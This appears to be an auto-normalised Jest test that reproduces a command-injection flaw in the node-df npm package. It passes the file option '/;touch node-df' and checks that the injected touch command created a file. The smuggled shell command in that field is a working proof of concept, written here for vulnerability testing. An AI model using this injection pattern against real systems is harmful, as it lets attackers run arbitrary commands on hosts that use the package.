const v31 = done => {
    const v17 = expect.assertions(2);
    v17;
    const df = require('node-df');
    const fs = require('fs');
    const path = './node-df';
    try {
        const v18 = fs.existsSync(path);
        if (v18) {
            const v19 = fs.unlinkSync(path);
            v19;
            const v20 = console.log('File removed:', path);
            v20;
        }
    } catch (err) {
        const v21 = console.error(err);
        v21;
    }
    file_exist = fs.existsSync(path);
    const v22 = expect(file_exist);
    const v23 = v22.toBe(false);
    v23;
    let options = {};
    options.file = '/;touch node-df';
    options.prefixMultiplier = 'GB';
    options.isDisplayPrefixMultiplier = true;
    options.precision = 2;
    const v29 = function (error, response) {
        file_exist = fs.existsSync(path);
        const v24 = expect(file_exist);
        const v25 = v24.toBe(true);
        v25;
        const v27 = function (err) {
            const v26 = done();
            v26;
        };
        const v28 = fs.unlink(path, v27);
        v28;
    };
    const v30 = df(options, v29);
    v30;
};
const v32 = test('Command Injection in node-df', v31);
v32;